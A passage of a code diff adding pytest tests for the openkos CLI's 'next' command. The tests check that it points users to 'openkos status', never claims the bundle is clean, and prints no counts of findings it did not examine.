+    monkeypatch.setattr("openkos.cli.main.OllamaClient", _RaisingOllamaClient)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+
+
+def test_no_runnable_action_names_status_on_a_truly_empty_bundle(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A freshly initialized workspace with a populated vector index and no
+    findings prints a line naming `openkos status`, and no wording claims
+    the bundle is clean (spec: No-Runnable-Action Output Never Claims
+    Cleanliness, "No ranked tier fires on a truly empty bundle")."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos status" in result.stdout
+    assert "clean" not in result.stdout.lower()
+    assert "nothing needs attention" not in result.stdout.lower()
+    assert "issue-free" not in result.stdout.lower()
+
+
+def test_no_runnable_action_same_output_despite_commandless_findings(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The same no-runnable-action line appears even when commandless
+    findings (a §9 conformance violation) exist in the bundle, because
+    `next`'s short-circuit means it never proves their absence (spec:
+    No-Runnable-Action Output Never Claims Cleanliness, "No ranked tier
+    fires despite commandless findings existing")."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    concepts_dir = tmp_path / "bundle" / "concepts"
+    concepts_dir.mkdir(parents=True, exist_ok=True)
+    (concepts_dir / "orphan.md").write_text(
+        "---\ntitle: no type here\n---\nBody.\n", encoding="utf-8"
+    )
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos status" in result.stdout
+    assert "clean" not in result.stdout.lower()
+
+
+def test_no_count_of_unseen_findings_when_a_tier_fires(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """When a ranked tier fires, no numeral describes how many other
+    findings exist or remain unseen (spec: No Count of Unseen Findings,
+    "No count appears when a tier fires")."""
+    _init_workspace(tmp_path, monkeypatch)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos reindex" in result.stdout
+    # No mask: the tier-1 output carries no numeral of its own, so any digit
+    # at all would be a count of findings `next` never looked at. Masking a
+    # bare "1" here would let the very regression this pins ("1 other item
+    # pending") through untouched.
+    assert not any(char.isdigit() for char in result.stdout)
+
+
+def test_no_count_of_unseen_findings_when_tier_4_has_paid_every_walk(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Reaching tier 4 (which has already paid for every walk) still prints
+    no numeral describing how many commandless or unranked findings exist,
+    even though a commandless finding is present in the bundle alongside a
+    duplicate group (spec: No Count of Unseen Findings, "No count appears
+    when tier 4 has already paid every walk"). Tier 4's own group count IS
+    allowed -- it describes the finding that fired, not findings `next`
+    skipped."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+    (tmp_path / "bundle" / "concepts" / "orphan.md").write_text(
+        "---\ntitle: no type here\n---\nBody.\n", encoding="utf-8"
+    )
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos duplicates" in result.stdout
+    assert "1 candidate group" in result.stdout
+    stripped = result.stdout.replace("1 candidate group", "")
+    assert not any(char.isdigit() for char in stripped)
